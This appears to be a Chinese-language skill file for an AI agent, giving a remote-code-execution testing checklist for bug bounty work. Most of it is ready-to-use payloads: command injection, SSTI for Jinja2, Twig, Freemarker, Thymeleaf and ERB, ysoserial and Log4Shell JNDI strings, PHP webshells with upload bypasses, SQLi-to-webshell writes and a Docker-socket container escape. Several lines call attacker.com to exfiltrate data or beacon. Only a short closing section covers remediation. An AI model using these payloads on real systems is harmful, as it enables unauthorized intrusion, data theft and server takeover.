---
name: claude-red-rce
description: 远程代码执行(RCE)测试方法论清单。覆盖OS命令注入、SSTI→RCE、反序列化RCE、文件上传RCE、XXE→SSRF→RCE、依赖混淆、CVE利用模式。当用户需要进行RCE测试或bug bounty发现代码执行漏洞时触发。
---

# 远程代码执行（RCE）测试方法论

## 快捷流程
1. 识别可疑用户输入位置（URL参数、HTTP头、body参数、文件上传）
2. 提交测试payload检测潜在漏洞
3. 如被阻止，尝试绕过技术
4. 确认漏洞：执行无害命令 `whoami`、`ls`、`sleep 5`

## 漏洞类型

### 代码注入
Python `eval()`、JavaScript `eval()`、PHP `eval()` 直接执行用户输入。

### 命令注入
未信任数据流入OS命令执行API：
```python
subprocess.run("ping -c 1 " + user, shell=True)  # vulnerable
subprocess.run(["ping", "-c", "1", user], shell=False)  # safer
```

### SSTI（服务端模板注入）
用户控制的模板字符串被模板引擎评估：
```python
{{7*7}}                              # 返回 49
{{''.__class__.__mro__[1].__subclasses__()}}
```

### 反序列化
反序列化未信任数据（Java .NET PHP pickle）：
```bash
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/beacon'
```

### 文件上传→处理链
上传解析器（ImageMagick、ExifTool、视频转码器）可能执行/解析复杂格式导致RCE。

## 测试Payloads

### 命令注入（Linux）
```bash
# 基本注入
; whoami  | whoami  || whoami  & whoami  && whoami  `whoami`  $(whoami)

# 时间检测
; sleep 10  | ping -c 10 127.0.0.1

# OAST
; nslookup $(whoami).attacker.com
; curl http://attacker.com/$(whoami)

# 空格绕过
cat</etc/passwd  {cat,/etc/passwd}  cat$IFS/etc/passwd
```

### SSTI（Jinja2/Python）
```python
# 检测
{{7*7}}

# RCE via __subclasses__
{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}

# Modern bypass (Python 3)
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
```

### SSTI（Twig/PHP）
```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("whoami")}}
```

### SSTI（Freemarker/Java）
```java
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("whoami")}
```

### SSTI（Thymeleaf/Spring）
```java
${T(java.lang.Runtime).getRuntime().exec('whoami')}
[[${T(java.lang.Runtime).getRuntime().exec('whoami')}]]
```

### SSTI（ERB/Ruby）
```ruby
<%= system("whoami") %>
<%= `whoami` %>
```

### SpEL（Spring Expression Language）
```java
${T(java.lang.Runtime).getRuntime().exec('whoami')}
#{T(java.lang.Runtime).getRuntime().exec('whoami')}
```

### OGNL（Struts）
```java
${@java.lang.Runtime@getRuntime().exec('whoami')}
```

### 反序列化（Java ysoserial）
```bash
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/beacon'
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/beacon'
```

### Python pickle
```python
import pickle, base64, os
class RCE:
    def __reduce__(self): return (os.system, ('whoami',))
print(base64.b64encode(pickle.dumps(RCE())))
```

## 漏洞利用链

### Log4Shell（CVE-2021-44228）
```bash
${jndi:ldap://attacker.com/a}
${jndi:rmi://attacker.com/a}
${jndi:dns://attacker.com/a}

# 混淆
${${lower:j}ndi:ldap://attacker.com/a}
${jndi:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
```

### Spring4Shell（CVE-2022-22965）
类加载器操作通过属性绑定。

### 文件上传→WebShell
```php
<?php system($_GET['c']); ?>

# 绕过扩展名
shell.php.jpg  shell.php%00.jpg  shell.pHp  shell.php::$DATA
shell.php.....  shell.php%0a.jpg

# Polyglot
GIF89a<?php system($_GET['c']); ?>
```

### .htaccess注入启用PHP
```apache
AddType application/x-httpd-php .jpg
AddHandler application/x-httpd-php .jpg
```

### ImageMagick RCE
```bash
# CVE-2022-44268 任意文件读取
convert -size 1x1 xc:red -set "profile:1" "/etc/passwd" exploit.png
```

### XXE→RCE
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]>
<root>&xxe;</root>
```

### SQLi→RCE
```sql
# MySQL
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

# PostgreSQL
COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/beacon';

# MSSQL
EXEC xp_cmdshell 'whoami';
```

### 容器逃逸
```bash
# Docker socket
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh

# 内核漏洞
# Dirty COW (CVE-2016-5195), DirtyPipe (CVE-2022-0847), DirtyCred (CVE-2022-2588)
```

### Prototype Pollution→RCE（Node.js）
```javascript
{"__proto__": {"NODE_OPTIONS": "--require /tmp/malicious.js"}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

## 工具

- **SSTI**: `tplmap`、`SSTImap`
- **反序列化**: `ysoserial`、`ysoserial.net`、`marshalsec`
- **命令注入**: Burp Intruder、`commix`
- **通用**: Burp ActiveScan、`nuclei`、`jaeles`
- **OAST**: Burp Collaborator、Interactsh、canarytokens.org

## 修复建议

- 消除危险函数：`eval`、`exec`、`subprocess.shell=True`、`Runtime.exec()`
- 参数化执行：`shell=False`；转义+白名单参数
- 模板引擎强化：禁用危险函数/标签；启用沙箱模式
- 严格上传验证：Content-Type + 扩展名检查；Magic bytes验证；重新编码/处理文件
- 沙箱文件处理：隔离容器/VM；seccomp/AppArmor/SELinux；非root运行
- 安全反序列化：JSON/XML + 严格schema；签名验证；避免 `pickle`/`marshal`
- 依赖管理：保持库更新；使用 `npm audit`、`pip-audit`、`OWASP Dependency-Check`
- 网络分段：出站过滤；限制应用服务器出站连接
- WAF/RASP
- Log4Shell：更新到Log4j 2.17.1+；设置 `log4j2.formatMsgNoLookups=true`
